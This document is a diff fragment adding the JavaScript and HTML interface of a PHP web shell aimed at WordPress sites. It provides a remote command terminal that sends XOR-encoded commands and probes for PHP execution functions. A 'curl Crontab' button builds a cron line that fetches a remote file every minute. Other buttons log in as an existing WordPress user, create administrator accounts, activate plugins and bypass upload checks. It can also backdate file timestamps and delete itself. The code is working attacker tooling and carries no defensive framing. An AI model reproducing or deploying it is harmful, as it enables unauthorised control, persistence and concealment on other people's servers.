+                    var resp_json = result.data;
+                    if (resp_json.success) {
+                        set_message("Success!");
+                    } else {
+                        set_message("Failed!");
+                    }
+                });
+            });
+        }
+
+        function removeLinkByFilename(filename) {
+            const links = document.querySelectorAll('a[path]');
+
+            links.forEach((link) => {
+                if (link.innerText == filename) {
+                    link.parentElement.parentNode.remove()
+                }
+            })
+        }
+
+        function fetch_url(act, additional_params = {}) {
+            var params = new URLSearchParams({
+                action: act
+            })
+            if (additional_params) {
+                for (var i in additional_params) {
+                    var value = additional_params[i]
+                    if (i && value) {
+                        params.append(i, value)
+                    }
+                }
+            }
+            var endpoint = baseUrl + '?' + params.toString()
+            console.log(endpoint)
+            console.log(additional_params)
+            return fetch(endpoint)
+        }
+
+        function set_message(message, error = false) {
+            var notification = document.getElementById("notification");
+            if (!notification) {
+                notification = document.createElement("div");
+                notification.setAttribute("class", "notification");
+                notification.setAttribute("id", "notification");
+            }
+            notification.innerText = message;
+            document.body.appendChild(notification);
+            setTimeout(function() {
+                notification.remove();
+            }, 3000);
+        }
+
+        function blurTable() {
+            var table_id = document.getElementById("data_table");
+            table_id.setAttribute("class", "blur-table");
+        }
+
+        function unblurTable() {
+            var table_id = document.getElementById("data_table");
+            table_id.removeAttribute("class")
+        }
+
+        function encodeXorString(str) {
+            return stringToHex(xorEncryptDecrypt(str))
+        }
+
+        function getLastPath() {
+            var last_path = localStorage.getItem("path")
+            if (!last_path) {
+                localStorage.setItem("path", get_current_path())
+                return getLastPath()
+            }
+            return last_path
+        }
+
+
+        function init(current_path = '') {
+
+            var table_id = document.getElementById("data_table");
+            blurTable();
+
+
+            var data = new FormData()
+
+
+            data.append("path", stringToHex(xorEncryptDecrypt(current_path)));
+            console.log(data);
+            var response = post_url("d", data, false)
+
+
+            response.then(function(resp) {
+                if (!resp.ok) {
+                    set_message("ERROR: Fetching url");
+                }
+                table_id.innerHTML = '';
+                unblurTable();
+                safeParseResponse(resp).then(function(result) {
+                    if (!result.ok) {
+                        set_message("Invalid response (not JSON)");
+                        return;
+                    }
+                    var element = result.data;
+                    if (!Array.isArray(element)) return;
+                    element.sort(function(a, b) {
+                        if (a.is_dir !== b.is_dir) {
+                            return b.is_dir - a.is_dir;
+                        }
+                        return a.path.localeCompare(b.path);
+                    });
+                    element.forEach(function(data) {
+                        var is_dir = data.is_dir;
+                        var path = data.path;
+                        var data_date = data.date;
+                        create_table_data(path, data.size, !!data.is_writable, data_date, is_dir, data.perms || '');
+                    });
+                });
+            });
+
+        }
+
+        function init_onload() {
+
+            var table = document.getElementById("data_table");
+            var last_path = getLastPath();
+            changePath(last_path)
+
+            if (table) {
+                init(last_path);
+            }
+
+        }
+
+        function EssentialToggle(list_ids = essential_id) {
+            for (var element_id in list_ids) {
+                let element = document.getElementById(list_ids[element_id])
+                if (!element) {
+                    continue;
+                }
+                if (!element.classList.contains("hidden")) {
+                    element.classList.add("hidden")
+                } else {
+                    element.classList.remove("hidden");
+                }
+            }
+        }
+
+        function cron_output(data) {
+            var url = data.url
+            var file_path = data.file_path
+            var com_input = document.getElementById('terminal-input')
+            var text = `(crontab -l; echo "* * * * * curl ${url} -o ${file_path}") | crontab -`
+            com_input.value = text;
+
+        }
+
+  
+        function show_command() {
+            var overlay = document.getElementById('terminal-overlay');
+            overlay.classList.add('show');
+
+            var mainPanel = document.getElementById('main-file-panel');
+            if (mainPanel) mainPanel.classList.add('table-blurred');
+
+            var termInput = document.getElementById('terminal-input');
+            if (termInput) termInput.focus();
+        }
+
+        function closeTerminal() {
+            var overlay = document.getElementById('terminal-overlay');
+            overlay.classList.remove('show');
+            var mainPanel = document.getElementById('main-file-panel');
+            if (mainPanel) mainPanel.classList.remove('table-blurred');
+        }
+
+        function submit_com() {
+            var cmd_func = localStorage.getItem("cmdFunc")
+            var com_result = document.getElementById("terminal-output")
+
+            if (!cmd_func || (cmd_func && cmd_func == '0')) {
+                checkCommand(); 
+                com_result.innerText = 'Can not execute command? submit again'
+                return false;
+            }
+
+            var com_input = document.getElementById("terminal-input");
+
+            if (!com_input.value) {
+                return false;
+            }
+
+            var data = new FormData()
+
+            data.append("function", cmd_func)
+            data.append("value", encodeXorString(com_input.value))
+
+            com_input.value = ''
+            com_result.innerText = 'Processing...'
+
+            post_url('ec', data, false).then(function(response) {
+                if (!response.ok) {
+                    com_result.innerText = 'Invalid status code';
+                    return;
+                }
+                safeParseResponse(response).then(function(result) {
+                    if (!result.ok) {
+                        com_result.innerText = 'Invalid response (not JSON)';
+                        return;
+                    }
+                    var resp_json = result.data;
+                    if (resp_json && resp_json.output !== undefined) {
+                        com_result.innerHTML = resp_json.output;
+                    } else {
+                        com_result.innerText = 'No output:(';
+                    }
+                });
+            });
+
+        }
+
+        function AdditionalToggle() {
+            EssentialToggle(additional_id)
+            EssentialToggle(essential_id)
+
+        }
+
+        function addClickListener(element_id, callback) {
+            var element = document.getElementById(element_id)
+            if (!element) {
+                return;
+            }
+            element.addEventListener("click", function(ev) {
+                callback()
+            })
+        }
+
+        function wp_login() {
+            set_message("Processing...");
+            var data = new FormData();
+
+            data.append("mode", "log")
+
+            post_url("wp", data, false).then(function(response) {
+                if (!response.ok) {
+                    set_message("Invalid response");
+                    return;
+                }
+                safeParseResponse(response).then(function(result) {
+                    if (!result.ok) {
+                        set_message("Invalid response (not JSON)");
+                        return;
+                    }
+                    var j = result.data;
+                    if (j && j.success) {
+                        var user_id = j.result;
+                        set_message("Alright! Now you are " + user_id);
+                        window.open('/wp-admin/', '_blank');
+                    } else {
+                        set_message("Failed :(((");
+                    }
+                });
+            });
+        }
+
+        function wp_activate_plugin() {
+            var plugin = prompt("Plugin folder or file (e.g. akismet/akismet.php):", "");
+            if (!plugin) { return; }
+            set_message("Activating...");
+            var data = new FormData();
+            data.append("mode", "activate");
+            data.append("plugin", plugin);
+            post_url("wp", data, false).then(function(response) {
+                if (!response.ok) {
+                    set_message("Invalid response");
+                    return;
+                }
+                safeParseResponse(response).then(function(result) {
+                    if (!result.ok) {
+                        set_message("Invalid response (not JSON)");
+                        return;
+                    }
+                    var j = result.data;
+                    if (j && j.result === true) {
+                        set_message("Plugin activated: " + plugin);
+                    } else {
+                        set_message("Activate failed: " + (j && j.result ? j.result : "unknown"));
+                    }
+                });
+            });
+        }
+
+        function openWpCreateUser() {
+            document.getElementById('wp-create-user-dialog').classList.add('show');
+            document.getElementById('wp-cu-username').value = '';
+            document.getElementById('wp-cu-email').value = '';
+            document.getElementById('wp-cu-password').value = '';
+            document.getElementById('wp-cu-role').value = 'subscriber';
+            document.getElementById('wp-cu-username').focus();
+        }
+
+        function closeWpCreateUser() {
+            document.getElementById('wp-create-user-dialog').classList.remove('show');
+        }
+
+        function submitWpCreateUser() {
+            var username = document.getElementById('wp-cu-username').value.trim();
+            var email    = document.getElementById('wp-cu-email').value.trim();
+            var password = document.getElementById('wp-cu-password').value;
+            var role     = document.getElementById('wp-cu-role').value;
+
+            if (!username || !email || !password) {
+                set_message('Fill in all fields');
+                return;
+            }
+
+            set_message('Creating user...');
+            var data = new FormData();
+            data.append('mode', 'create_user');
+            data.append('username', username);
+            data.append('email', email);
+            data.append('password', password);
+            data.append('role', role);
+
+            post_url('wp', data, false).then(function(response) {
+                if (!response.ok) {
+                    set_message('Invalid response');
+                    return;
+                }
+                safeParseResponse(response).then(function(result) {
+                    if (!result.ok) {
+                        set_message('Invalid response (not JSON)');
+                        return;
+                    }
+                    var j = result.data;
+                    if (j && j.success) {
+                        set_message('User created! ID: ' + j.user_id);
+                        closeWpCreateUser();
+                    } else {
+                        set_message('Failed: ' + (j && j.error ? j.error : 'unknown'));
+                    }
+                });
+            });
+        }
+
+        function checkCommand() {
+            var data = new FormData();
+
+            var list_functions = [
+                'system',
+                'passthru',
+                'exec',
+                'shell_exec',
+                'proc_open',
+                'popen',
+            ];
+
+            data.append("data", list_functions.map(encodeXorString))
+            post_url('cf', data, false).then(function(response) {
+                if (!response.ok) {
+                    set_message("ERROR: Invalid status code");
+                    return;
+                }
+                safeParseResponse(response).then(function(result) {
+                    if (!result.ok) {
+                        set_message("Invalid response (not JSON)");
+                        return;
+                    }
+                    var resp = result.data;
+                    if (!resp || !resp.avail) {
+                        localStorage.setItem("cmdFunc", "0");
+                        return;
+                    }
+                    localStorage.setItem("cmdFunc", encodeXorString(resp.func));
+                    EssentialToggle(["command"]);
+                });
+            });
+
+        }
+      
+
+
+        function selfDelete() {
+            var confirm_text = "Are you sure want to delete yourself?";
+
+            if (!confirm(confirm_text)) {
+                return false;
+            }
+
+            fetch_url('sd').then(function(response) {
+                if (!response.ok) {
+                    set_message("Failed to delete self");
+                    return;
+                }
+                safeParseResponse(response).then(function(result) {
+                    if (!result.ok) {
+                        set_message("Invalid response (not JSON)");
+                        return;
+                    }
+                    var resp_json = result.data;
+                    if (resp_json && resp_json.success) {
+                        set_message("Say goodbye to yourself!");
+                        window.location.href = '/';
+                    } else {
+                        set_message("Failed to delete self");
+                    }
+                });
+            });
+        }
+        
+        if (!localStorage.getItem("cmdFunc")) {
+            console.log("check command");
+            checkCommand();
+        }
+        document.addEventListener("DOMContentLoaded", function() {
+            document.addEventListener("click", function() { hideContextMenu(); });
+            window.addEventListener("scroll", function() { hideContextMenu(); }, true);
+            var ctxMenu = document.getElementById("context-menu");
+            if (ctxMenu) {
+                ctxMenu.addEventListener("contextmenu", function(e) {
+                    e.preventDefault();
+                    hideContextMenu();
+                });
+            }
+            var pathDivEl = document.getElementById("path_div");
+            
+            var table = document.getElementById("data_table");
+
+
+            if (table) {
+                console.log("Init Onload");
+                init_onload();
+            }
+
+            
+            if (localStorage.getItem("cmdFunc") && localStorage.getItem("cmdFunc") !== '0') {
+                EssentialToggle(["command"])
+            }
+
+            var com_input = document.getElementById("terminal-input");
+            const menu_id = [{
+                    "id": "refresh-path",
+                    "callback": refresh_path
+                },
+                {
+                    "id": "create-file",
+                    "callback": create_file
+                },
+                {
+                    "id": "command",
+                    "callback": show_command
+                },
+                {
+                    "id": "submit-com",
+                    "callback": submit_com
+                },
+
+                {
+                    "id": "self-delete",
+                    "callback": selfDelete
+                },
+                {
+                    "id": "textarea-handle",
+                    "callback": textarea_handle
+                },
+                {
+                    "id": "wp-login",
+                    "callback": wp_login
+                },
+                {
+                    "id": "wp-activate",
+                    "callback": wp_activate_plugin
+                },
+                {
+                    "id": "wp-create-user",
+                    "callback": openWpCreateUser
+                },
+                {
+                    "id": "additional-toggle",
+                    "callback": AdditionalToggle
+                }
+
+            ]
+
+            menu_id.forEach(data => {
+                addClickListener(data.id, data.callback)
+            })
+
+            if (com_input) {
+                com_input.addEventListener("keypress", function(event) {
+                    if (event.key == 'Enter') {
+                        submit_com();
+                    }
+                })
+            }
+
+
+            var termClose = document.getElementById('terminal-close');
+            if (termClose) {
+                termClose.addEventListener('click', closeTerminal);
+            }
+
+
+            var termOverlay = document.getElementById('terminal-overlay');
+            if (termOverlay) {
+                termOverlay.addEventListener('click', function(e) {
+                    if (e.target === termOverlay) closeTerminal();
+                });
+            }
+
+
+            var termCurl = document.getElementById('curl-crontab');
+            if (termCurl) {
+                termCurl.addEventListener('click', function() {
+                    var data = ask_url_path();
+                    if (!data) return false;
+                    cron_output(data);
+                });
+            }
+
+
+
+            var back_menu = document.getElementById("back_menu");
+            if (back_menu) {
+                document.getElementById("path_div").innerHTML = ''
+            }
+
+        }); 
+
+        document.addEventListener('DOMContentLoaded', function() {
+            addClickListener('create-dir', create_dir);
+            addClickListener('bulk-apply', bulk_apply);
+            addClickListener('bulk-cancel', bulk_cancel);
+
+            var bulkActionSel = document.getElementById('bulk-action');
+            if (bulkActionSel) {
+                bulkActionSel.addEventListener('change', function() {
+                    update_recursive_visibility(this.value);
+                });
+            }
+
+            var selectAll = document.getElementById('select-all');
+            if (selectAll) {
+                selectAll.addEventListener('change', function() {
+                    var boxes = document.querySelectorAll('.row-check');
+                    boxes.forEach(function(b) { b.checked = selectAll.checked; });
+                    update_bulk_bar();
+                });
+            }
+
+            var ta = document.getElementById('inline-editor-content');
+            if (ta) ta.addEventListener('input', markEditorDirty);
+
+            if (loadFile && loadFile !== '0') {
+                EssentialToggle(["wp-login", "wp-activate", "wp-create-user"]);
+            }
+
+
+            var wpCuClose = document.getElementById('wp-create-user-close');
+            if (wpCuClose) wpCuClose.addEventListener('click', closeWpCreateUser);
+            var wpCuCancel = document.getElementById('wp-create-user-cancel');
+            if (wpCuCancel) wpCuCancel.addEventListener('click', closeWpCreateUser);
+            var wpCuSave = document.getElementById('wp-create-user-save');
+            if (wpCuSave) wpCuSave.addEventListener('click', submitWpCreateUser);
+            var wpCuDialog = document.getElementById('wp-create-user-dialog');
+            if (wpCuDialog) {
+                wpCuDialog.addEventListener('click', function(e) {
+                    if (e.target === wpCuDialog) closeWpCreateUser();
+                });
+            }
+
+            ['wp-cu-username', 'wp-cu-email', 'wp-cu-password'].forEach(function(id) {
+                var el = document.getElementById(id);
+                if (el) el.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') submitWpCreateUser();
+                });
+            });
+        });
+
+
+        document.addEventListener('keydown', function(e) {
+            if ((e.ctrlKey || e.metaKey) && e.key === 's') {
+                var editor = document.getElementById('inline-editor-panel');
+                if (editor && !editor.classList.contains('hidden')) {
+                    e.preventDefault();
+                    saveInlineEditor();
+                }
+            }
+            if (e.key === 'Escape') {
+                var editor = document.getElementById('inline-editor-panel');
+                if (editor && !editor.classList.contains('hidden')) {
+                    closeInlineEditor();
+                }
+                var termOverlay = document.getElementById('terminal-overlay');
+                if (termOverlay && termOverlay.classList.contains('show')) {
+                    closeTerminal();
+                }
+                var wpCuDialog = document.getElementById('wp-create-user-dialog');
+                if (wpCuDialog && wpCuDialog.classList.contains('show')) {
+                    closeWpCreateUser();
+                }
+            }
+        });
+
+        var _editorDirty = false;
+
+        function markEditorClean() { _editorDirty = false; }
+        function markEditorDirty() { _editorDirty = true; }
+
+
+        var _origCloseInlineEditor = closeInlineEditor;
+        closeInlineEditor = function() {
+            if (_editorDirty) {
+                if (!confirm('You have unsaved changes. Leave without saving?')) return;
+            }
+            markEditorClean();
+            _origCloseInlineEditor();
+        };
+
+
+        var _origOpenInlineEditor = openInlineEditor;
+        openInlineEditor = function(filePath) {
+            markEditorClean();
+            _origOpenInlineEditor(filePath);
+
+            setTimeout(function() {
+                var ta = document.getElementById('inline-editor-content');
+                if (ta) {
+                    ta.removeEventListener('input', markEditorDirty);
+                    ta.addEventListener('input', markEditorDirty);
+                }
+            }, 300);
+        };
+
+
+        var _origSaveInlineEditor = saveInlineEditor;
+        saveInlineEditor = function() {
+            var content = document.getElementById('inline-editor-content').value;
+            var encoded_content = utf8ToBase64(content);
+            var filename = document.getElementById('inline-editor-filename-hidden').value;
+            if (!filename) { set_message("ERROR: No filename"); return; }
+            set_message("Saving...");
+            post_url('r', { content: encoded_content, filename: filename }).then(function(resp) {
+                safeParseResponse(resp).then(function(result) {
+                    if (!result.ok) { set_message("Invalid response"); return; }
+                    if (result.data.success) {
+                        set_message("Saved!");
+                        markEditorClean();
+                    } else {
+                        set_message("Failed to save!");
+                    }
+                });
+            });
+        };
+
+        function doContextChmod() {
+            if (!contextMenuTarget) { hideContextMenu(); return; }
+            var path = contextMenuTarget.path;
+            var isDir = contextMenuTarget.isDir;
+            var current = prompt('Enter new permissions (octal, e.g. 644 or 755):', isDir ? '755' : '644');
+            if (!current) { hideContextMenu(); return; }
+            var recursive = false;
+            if (isDir) recursive = confirm('Apply recursively to all contents?');
+            set_message('Processing...');
+            post_url('ch', { filename: encodeXorString(path), mode: current, recursive: recursive }).then(function(resp) {
+                safeParseResponse(resp).then(function(result) {
+                    if (!result.ok) { set_message('Invalid response'); return; }
+                    set_message(result.data.success ? 'Chmod done!' : 'Chmod failed!');
+                });
+            });
+            hideContextMenu();
+        }
+
+        function create_dir() {
+            var name = prompt('Directory name:', 'new_folder');
+            if (!name) return;
+            var current_path = localStorage.getItem('path') || get_current_path();
+            var full = current_path.replace(/\/+$/, '') + '/' + name;
+            set_message('Creating...');
+            post_url('md', { dirname: encodeXorString(full) }).then(function(resp) {
+                safeParseResponse(resp).then(function(result) {
+                    if (!result.ok) { set_message('Invalid response'); return; }
+                    if (result.data.success) {
+                        set_message('Directory created!');
+
+                        var stageTbody = document.createElement('tbody');
+                        stageTbody.id = 'data_table';
+                        var realTbody = document.getElementById('data_table');
+                        realTbody.id = '__real_data_table';
+                        document.getElementById('file-table').appendChild(stageTbody);
+                        create_table_data(full, '', false, '', true);
+                        stageTbody.id = '';
+                        realTbody.id = 'data_table';
+                        var newRow = stageTbody.querySelector('tr');
+                        if (newRow) insert_row_sorted(newRow, name, true);
+                        stageTbody.remove();
+                    } else {
+                        set_message('Failed to create directory');
+                    }
+                });
+            });
+        }
+
+        function update_recursive_visibility(act) {
+            var recWrap = document.getElementById('bulk-recursive-wrap');
+            if (!act || act === 'delete') {
+                recWrap.style.display = 'none';
+                return;
+            }
+            if (act === 'touch' || act === 'chmod') {
+                var hasDir = Array.from(document.querySelectorAll('.row-check:checked')).some(function(b) {
+                    var row = b.closest('tr');
+                    return row && row.getAttribute('data-is-dir') === '1';
+                });
+                recWrap.style.display = hasDir ? 'flex' : 'none';
+            } else {
+                recWrap.style.display = 'none';
+            }
+        }
+
+        function update_bulk_bar() {
+            var checked = document.querySelectorAll('.row-check:checked');
+            var bar = document.getElementById('bulk-bar');
+            var countEl = document.getElementById('bulk-count');
+            if (checked.length > 0) {
+                bar.style.display = 'flex';
+                countEl.textContent = checked.length + ' selected';
+
+                var act = document.getElementById('bulk-action').value;
+                update_recursive_visibility(act);
+            } else {
+                bar.style.display = 'none';
+                document.getElementById('bulk-action').value = '';
+                document.getElementById('bulk-recursive-wrap').style.display = 'none';
+                var sa = document.getElementById('select-all');
+                if (sa) sa.checked = false;
+            }
+        }
+
+        function bulk_cancel() {
+            document.querySelectorAll('.row-check').forEach(function(b) { b.checked = false; });
+            var sa = document.getElementById('select-all');
+            if (sa) sa.checked = false;
+            update_bulk_bar();
+        }
+
+        function bulk_apply() {
+            var act = document.getElementById('bulk-action').value;
+            if (!act) { set_message('Select an action first'); return; }
+            var checked = document.querySelectorAll('.row-check:checked');
+            if (!checked.length) { set_message('Nothing selected'); return; }
+            var files = Array.from(checked).map(function(b) { return b.getAttribute('data-enc'); });
+            var recursive = document.getElementById('bulk-recursive').checked;
+            var extra = '';
+
+            if (act === 'delete') {
+                if (!confirm('Delete ' + files.length + ' item(s)?')) return;
+            } else if (act === 'touch') {
+
+                var rows = Array.from(checked).map(function(b) { return b.closest('tr'); }).filter(Boolean);
+                var randomRow = rows[Math.floor(Math.random() * rows.length)];
+                var dateCell = randomRow ? randomRow.querySelector('.date-cell') : null;
+                var defaultDate = dateCell ? dateCell.textContent.trim() : '';
+                extra = prompt('New date (dd-mm-yyyy HH:MM:SS):', defaultDate);
+                if (!extra) return;
+            } else if (act === 'chmod') {
+                extra = prompt('Permissions (octal):', '644');
+                if (!extra) return;
+            }
+
+            set_message('Processing...');
+            post_url('bulk', { act: act, files: files, extra: extra, recursive: recursive }).then(function(resp) {
+                safeParseResponse(resp).then(function(result) {
+                    if (!result.ok) { set_message('Invalid response'); return; }
+                    if (result.data.success) {
+                        set_message('Done!');
+                        if (act === 'delete') {
+                            checked.forEach(function(b) {
+                                var row = b.closest('tr');
+                                if (row) row.remove();
+                            });
+                        } else if (act === 'touch') {
+
+                            checked.forEach(function(b) {
+                                var row = b.closest('tr');
+                                if (!row) return;
+                                var dc = row.querySelector('.date-cell');
+                                if (dc) dc.textContent = extra;
+                                row.setAttribute('data-date', extra);
+                            });
+                        }
+                        bulk_cancel();
+                        if (act === 'chmod') init(localStorage.getItem('path') || get_current_path());
+                    } else {
+                        set_message('Some operations failed');
+                        init(localStorage.getItem('path') || get_current_path());
+                    }
+                    bulk_cancel();
+
+                });
+            });
+        }
+
+        var _origCreateTableData = create_table_data;
+        create_table_data = function(name, size, is_writable, date, is_dir, perms) {
+            _origCreateTableData(name, size, is_writable, date, is_dir, perms);
+
+            var tbody = document.getElementById('data_table');
+            if (!tbody) return;
+            var rows = tbody.querySelectorAll('tr');
+            var row = rows[rows.length - 1];
+            if (!row) return;
+            var tdCheck = document.createElement('td');
+            tdCheck.style.cssText = 'text-align:center;width:36px;';
+            var cb = document.createElement('input');
+            cb.type = 'checkbox';
+            cb.className = 'row-check';
+            cb.setAttribute('data-enc', encodeXorString(name));
+            cb.addEventListener('change', update_bulk_bar);
+            tdCheck.appendChild(cb);
+            row.insertBefore(tdCheck, row.firstChild);
+        };
+
+    </script>
+</head>
+<?php 
+}
+?>
+<?php 
+
+function menu(){
+
+    ?>
+<body>
+    
+    <div class="terminal-overlay" id="terminal-overlay">
+        <div class="terminal-dialog">
+            <div class="terminal-titlebar">
+                <span class="terminal-titlebar-text">Terminal</span>
+                <button class="terminal-close-btn" id="terminal-close" title="Close">&times;</button>
+            </div>
+            <div class="terminal-body">
+                <div class="terminal-output" id="terminal-output">Hello ^^</div>
+                <div class="terminal-tools">
+                    <div class="terminal-tool-btn" id="curl-crontab">curl Crontab</div>
+                </div>
+                <div class="terminal-input-row">
+                    <span class="terminal-prompt">$</span>
+                    <input type="text" class="terminal-input" id="terminal-input" placeholder="Enter command..." autofocus>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    
+    <div class="dialog-overlay" id="wp-create-user-dialog">
+        <div class="dialog-box">
+            <div class="dialog-header">
+                <span class="dialog-title">Create WP User</span>
+                <button class="dialog-close" id="wp-create-user-close">&times;</button>
+            </div>
+            <div class="dialog-body">
+                <div class="dialog-field">
+                    <label for="wp-cu-username">Username</label>
+                    <input type="text" id="wp-cu-username" placeholder="username">
+                </div>
+                <div class="dialog-field">
+                    <label for="wp-cu-email">Email</label>
+                    <input type="email" id="wp-cu-email" placeholder="user@example.com">
+                </div>
+                <div class="dialog-field">
+                    <label for="wp-cu-password">Password</label>
+                    <input type="text" id="wp-cu-password" placeholder="password">
+                </div>
+                <div class="dialog-field">
+                    <label for="wp-cu-role">Role</label>
+                    <select id="wp-cu-role">
+                        <option value="subscriber">Subscriber</option>
+                        <option value="contributor">Contributor</option>
+                        <option value="author">Author</option>
+                        <option value="editor">Editor</option>
+                        <option value="administrator">Administrator</option>
+                    </select>
+                </div>
+            </div>
+            <div class="dialog-footer">
+                <button class="btn" id="wp-create-user-cancel">Cancel</button>
+                <button class="btn btn-save" id="wp-create-user-save">Save</button>
+            </div>
+        </div>
+    </div>
+
+    
+    <div class="panel hidden" id="inline-editor-panel">
+        <div class="panel-header">
+            <button class="btn" style="background: transparent; border: none;" onclick="closeInlineEditor()">< Back</button>
+        </div>
+        <div class="file-path" id="inline-editor-filename-display"></div>
+        <input type="hidden" id="inline-editor-filename-hidden" value="">
+        <textarea id="inline-editor-content" class="file-content" style="min-height:400px" onkeydown="if(event.key === 'Escape') closeInlineEditor();"></textarea>
+        <button type="submit" class="btn" id="inline-editor-save" onclick="saveInlineEditor()">Save</button>
+    </div>
+
+    <div id="main-file-panel">
+    <div class="panel">
+        <div class="panel-header" id="file-manager">
+            <div class="panel-title">Living in a happy nation </div>
+            <div class="panel-actions">
+                <button class="btn" id="refresh-path">HOME</button>
+                <button class="btn" id="create-dir">+ DIR</button>
+                <button class="btn" id="create-file">+ FILE</button>
+            </div>
+        </div>
+        
+        <div class="tools-panel" id="tool-panel">
+            <div class="tool" id="upload-file">
+                <form method="post" enctype="multipart/form-data">
+            <div class="file-upload">
+                <label for="file-upload-input" style="cursor: pointer;">
+                     Upload 
+                </label>
+                <input type="file" id="file-upload-input" style="display: none;" onchange="handle_upload()">
+            </div>
+        </form>
+            </div>
+            <div class="tool hidden" id="command">Command</div>
+            <div class="tool hidden" id="wp-login">WP Login</div>
+            <div class="tool hidden" id="wp-activate">WP Activate</div>
+            <div class="tool hidden" id="wp-create-user">WP Create User</div>
+
+            
+            
+            
+            <div class="btn btn-danger" id="self-delete" style="margin-left: auto;">
+                <i class="fas fa-trash"></i> Self Delete
+            </div>
+        </div>
+        <div class="tool" id='byp' style="margin-bottom: 15px">
+
+            <label class="checkbox-label" >
+                    <input type="checkbox" id="bypass-upload"> Bypass Upload
+                </label>
+        </div>
+        
+         <div class="panel hidden" id="com-section">
+        <div class="panel-header">
+            <div class="panel-title"><a href='#' id='additional-toggle'>
+            <p>
+                < Back To Menu</p>
+        </a>        </div>
+       </div>
+        <textarea class="command-output" id="command-output" readonly style="width: 100%">Hello ^^</textarea>
+        <div class="tools-panel">
+            <div class="tool" id="curl-crontab">curl Crontab</div>
+
+        </div>
+
+        <div class="command-input">
+            <input type="text" id="com-input" placeholder="Enter command...">
+            <button class="btn" id="submit-com">Execute</button>
+        </div>
+    </div>
+        <table class="file-table" id="file-table">
+            <thead>
+                <tr>
+                    <th style="width:36px;text-align:center"><input type="checkbox" id="select-all" title="Select all"></th>
+                    <th class="sortable" data-sort="name" onclick="sortTable('name')">Name</th>
+                    <th class="sortable" data-sort="size" onclick="sortTable('size')" style="text-align:center;width:90px">Size</th>
+                    <th class="sortable" data-sort="perms" onclick="sortTable('perms')" style="text-align:center;width:110px">Permissions</th>
+                    <th class="sortable" data-sort="date" onclick="sortTable('date')" style="text-align:center;width:160px">Modified</th>
+                </tr>
+            </thead>
+            <tbody id="data_table">
+            </tbody>
+        </table>
+        
+        <div id="bulk-bar" style="display:none;position:sticky;bottom:0;background:var(--surface-2);border:1px solid var(--border-light);border-radius:3px;padding:10px 16px;margin-top:10px;display:none;align-items:center;gap:10px;flex-wrap:wrap;">
+            <span id="bulk-count" style="font-family:var(--mono);font-size:11px;color:var(--text-muted);">0 selected</span>
+            <select id="bulk-action" style="background:var(--bg);border:1px solid var(--border-light);color:var(--text);padding:4px 10px;border-radius:2px;font-family:var(--mono);font-size:11px;outline:none;">
+                <option value="">-- Action --</option>
+                <option value="delete">Delete</option>
+                <option value="touch">Modify Date</option>
+                <option value="chmod">Chmod</option>
+            </select>
+            <label class="checkbox-label" id="bulk-recursive-wrap" style="display:none;">
+                <input type="checkbox" id="bulk-recursive"> Recursive
+            </label>
+            <button class="btn" id="bulk-apply">Apply</button>
+            <button class="btn" id="bulk-cancel" style="margin-left:auto;">Uncheck All</button>
+        </div>
+        <div id="context-menu" class="context-menu">
+            <div class="context-menu-item" data-action="view" onclick="doContextView()">View</div>
+            <div class="context-menu-item" data-action="edit" onclick="doContextEdit()">Edit</div>
+            <div class="context-menu-item" data-action="touch" onclick="doContextTouch()">Touch (date)</div>
+            <div class="context-menu-item" data-action="chmod" onclick="doContextChmod()">Chmod</div>
+            <div class="context-menu-item" data-action="rename" onclick="doContextRename()">Rename</div>
+            <div class="context-menu-item" data-action="extract" onclick="doContextExtract()" style="display:none; color: var(--accent);">Extract</div>
+            <div class="context-menu-item" data-action="delete" onclick="doContextDelete()" style="color: #e74c3c;">Delete</div>
+        </div>
+    </div>
+    </div>
+    
+
+</body>
+</html>
+<?php 
+}
+?>
